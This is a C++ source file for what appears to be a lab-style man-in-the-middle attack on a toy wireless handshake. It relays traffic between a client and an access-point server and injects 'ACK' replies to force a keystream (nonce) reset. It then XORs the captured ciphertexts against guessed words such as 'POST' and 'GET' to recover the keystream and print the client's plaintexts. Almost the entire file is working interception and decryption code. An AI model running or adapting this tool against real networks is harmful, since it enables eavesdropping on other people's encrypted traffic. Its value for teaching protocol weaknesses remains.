#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <string.h>
#include <sys/select.h>
#include <time.h>
#include <iostream>
#include <time.h>
#include <openssl/md5.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <fstream>
#define MAXBUF 1024
using namespace std;


int MyRead(int socket, char *s, int len, struct timeval *time);
int MyWrite(int socket, char *s, int len, struct timeval *time);
int Init(int port);
int ConnectionGenerate(string IP, int port);
int Acception(int l_fd);
void Intercept(int c_fd, int s_fd);
void PrintHex(char *s, int n);
void Crack();
int Verify(char key[]);

char Msg[MAXBUF][17] = {0};
int MsgCount = 0; 

int main(int argc, char *argv[])
{
	int count = 0;
	int mlen;
	struct timeval time; // 10s maximum delay.
	char buf[MAXBUF];
	int LocalPort;;
	int ServerPort;
	string IP;
	if(argc != 4)
	{
		cout << "Usage with parameters [AP IP] [AP PORT] [LOCAL PORT]" << endl;
		exit(-1);
	}
	IP = argv[1];
	ServerPort = atoi(argv[2]);
	LocalPort = atoi(argv[3]);
	int s_fd = ConnectionGenerate(IP, ServerPort);

	int l_fd = Init(LocalPort);
	int c_fd = Acception(l_fd);

	cout << endl << "----------------Intercepting-----------------" << endl;
	Intercept(c_fd, s_fd);
	close(c_fd);
	close(s_fd);
	close(l_fd);
	cout << "-------------Intercepting done---------------" << endl << endl;
	Crack();
	return 0;
}

int Init(int port)
{
 	struct sockaddr_in s_in;//server address structure
    int l_fd;
    memset((void *)&s_in,0,sizeof(s_in));    
    //bzero((void *)&s_in,sizeof(s_in));
    s_in.sin_family = AF_INET;//IPV4 communication domain
    s_in.sin_addr.s_addr = INADDR_ANY;//accept any address
    s_in.sin_port = htons(port);//change port to netchar

    l_fd = socket(AF_INET,SOCK_STREAM,0);//socket(int domain, int type, int protocol)

    if( (bind(l_fd,(struct sockaddr *)&s_in,sizeof(s_in))) == -1)
	{
		cout << "Bind error!" << endl;
		exit(-1);
	}
	
    if(!listen(l_fd,10))//lisiening start
    	cout << "Initiallization succeeded!"<<endl;
    else
    {
    	cout << "Listen error!" << endl;
    	exit(-1); 
    }
    return l_fd;
}
int ConnectionGenerate(string IP, int port)
{
	int s_fd;
	struct sockaddr_in s_in;
	memset((void *)&s_in,0,sizeof(s_in));

    s_in.sin_family = AF_INET;
    s_in.sin_port = htons(port);
    inet_pton(AF_INET, IP.c_str(),(void *)&s_in.sin_addr);

    s_fd = socket(AF_INET,SOCK_STREAM,0);

    if( connect(s_fd,(struct sockaddr *)&s_in,sizeof(s_in)) == -1 )
	{
		cout << "Connect to server failed" << endl;
		exit(-1);
	}
	cout << "Connection to server built" <<endl;
	return s_fd;
}
int Acception(int l_fd)
{
    int c_fd;
	struct sockaddr_in c_in;//client address structure
    socklen_t client_len;
    char ipstr[128];
	cout<<"Waiting for connection."<<endl;
	client_len = sizeof(c_in);
    c_fd = accept(l_fd,(struct sockaddr *)&c_in,&client_len);
    if(c_fd < 0)
    {
    	cout << "Acception error" << endl;
    	exit(-1);
    }
    cout << "Client IP: " << inet_ntop(AF_INET, &c_in.sin_addr.s_addr, ipstr, sizeof(ipstr)) << ". Port: " << ntohs(c_in.sin_port) << endl;
    return c_fd;
}

int MyRead(int socket, char *s, int len, struct timeval *time)
{
	int mlen;
	char buf[MAXBUF];
	fd_set rfds;
	FD_ZERO(&rfds);
	FD_SET(socket, &rfds);
	if(select(socket+1, &rfds, NULL, NULL, time) <= 0)
		return -1;
	else
		mlen = read(socket,buf,len);
	buf[mlen] = '\0';
	strcpy(s, buf);
	return mlen;

}
int MyWrite(int socket, char *s, int len, struct timeval *time)
{
	int mlen;
	char buf[MAXBUF];
	fd_set wfds;
	FD_ZERO(&wfds);
	FD_SET(socket,&wfds);
	if(select(socket+1, NULL, &wfds, NULL, time) <= 0)
		return -1;
	else
		mlen = write(socket, s ,len);
	return mlen;
}

void Intercept(int c_fd, int s_fd)
{
	char t[MAXBUF];
	int mlen, i;
	char buf[MAXBUF];
	timeval time;
	for(i = 0; i < 2; i++)
	{
		mlen = MyRead(c_fd, buf, MAXBUF, NULL);
		cout << "Receive " << mlen << " bytes from client: ";
		PrintHex(buf, mlen);
		mlen = MyWrite(s_fd, buf, mlen, NULL);
		mlen = MyRead(s_fd, buf, MAXBUF, NULL);
		cout << "Receive " << mlen << " bytes from server: ";
		PrintHex(buf, mlen);
		mlen = MyWrite(c_fd, buf, mlen, NULL);
	}
	cout << endl;
	MyRead(c_fd, t ,MAXBUF, NULL);
	strcpy(buf, "ACK");
	MyWrite(s_fd, buf, 3, NULL);
	while((mlen = MyRead(c_fd, buf, MAXBUF, NULL)) > 0)
	{
		strcpy(Msg[MsgCount], buf);
		MsgCount++;
		strcpy(buf, "ACK");
		MyWrite(c_fd, buf, 3, NULL);
		MyWrite(s_fd, buf, 3, NULL);
		cout << "Send Msg3, Msg4: nounce reset signal!"<<endl;
		cout << "Receive " << mlen << " bytes from client: ";
		MyRead(c_fd, t, MAXBUF, NULL); // Receive "ACK" from client
		PrintHex(buf, mlen);
		cout << endl;
		MyWrite(s_fd, buf, mlen, NULL);
	}
	cout << endl;
}

void PrintHex(char *s, int n)
{
	for(int i = 0; i < n; i++)
		printf("%02x ", (unsigned char)s[i]);
	cout << endl;
}
void Crack()
{
	int i, j, k, flag1 = 1, flag2;
	char s[5][MAXBUF] = {0};
	char key[17] = {0};
	char plaintext[17] = {0};
	strcpy(s[0], "POST");
	strcpy(s[1], "GET");
	strcpy(s[2], "HTTP");
	strcpy(s[3], "INPUT");
	strcpy(s[4], "OUTPUT");
	cout << "Collected " << MsgCount << " messages: " << endl;
	for(i = 0; i < MsgCount; i++)
		PrintHex(Msg[i], 16);
	cout << "After crack and analysis:" << endl;
	for(i = 0; (i < 5) && flag1; i++)
		for(j = i; j < 5; j++)
		{
			flag2 = 1;
			for(k = 0; k <16; k++)
			{
				if( (s[i][k] ^ s[j][k]) != (Msg[0][k] ^ Msg[1][k]) )
				{
					flag2 = 0;
					break;
				}
			}
			if(flag2)
			{
				flag1 = 0; 
				break;
			}
		}

	if(flag1)
	{
		cout << "Crack failed!" << endl;
		exit(-1);
	}
	i--;

	for(k = 0; k < 16; k++)
		key[k] = Msg[0][k] ^ s[i][k];
	if(Verify(key))
	{
		cout << "Keystream: ";
		PrintHex(key, 16);
	}
	else
	{
		for(k = 0; k < 16; k++)
			key[k] = Msg[1][k] ^ s[i][k];
		if(Verify(key))
		{
			cout << "Keystream: ";
			PrintHex(key, 16);
		}
		else
		{
			cout << "Key crack failed!" << endl;
			exit(-1);
		}
	}
	cout << "Plaintexts from client:" << endl;
	for(i = 0; i < MsgCount; i++)
	{
		for(j = 0; j < 16; j++)
			plaintext[j] = Msg[i][j] ^ key[j];
		cout << plaintext << endl;
	}
}

int Verify(char key[])
{
	int i, j;
	char plaintext[17];
	for(i = 0; i < MsgCount; i++)
	{
		for(j = 0; j < 16; j++)
			plaintext[j] = Msg[i][j] ^ key[j];
		if(strcmp(plaintext, "POST") && strcmp(plaintext, "GET") && strcmp(plaintext, "HTTP") && strcmp(plaintext, "INPUT") && strcmp(plaintext, "OUTPUT"))
			return 0;
	}
	return 1;
}